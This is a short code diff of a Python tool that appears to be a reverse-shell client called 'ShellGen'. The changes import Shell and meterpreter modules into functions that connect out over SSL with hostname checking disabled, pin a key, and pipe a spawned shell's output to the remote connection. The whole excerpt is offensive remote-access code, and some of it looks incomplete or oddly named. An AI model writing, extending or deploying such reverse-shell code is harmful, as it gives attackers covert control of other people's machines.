@@ -3,9 +3,12 @@ import argparse
 import socket
 import ssl
 import shlex
+from shell import Shell
+from meterpreter import meterpreter_meterpreter
 
 
 def interactive_shell(conn):
+    shell = Shell()
     prompt = "[ShellGen]> "
     while True:
         try:
@@ -41,6 +44,7 @@ def interactive_shell(conn):
 
 
 def run_shell(conn):
+    shell = Shell()
     cmd = shell.GetShell()
     cmd.stdout = conn
     cmd.stderr = conn
@@ -61,6 +65,7 @@ def check_key_pin(conn, fingerprint):
 
 
 def reverse(connect_string, fingerprint):
+    conn = None
     try:
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
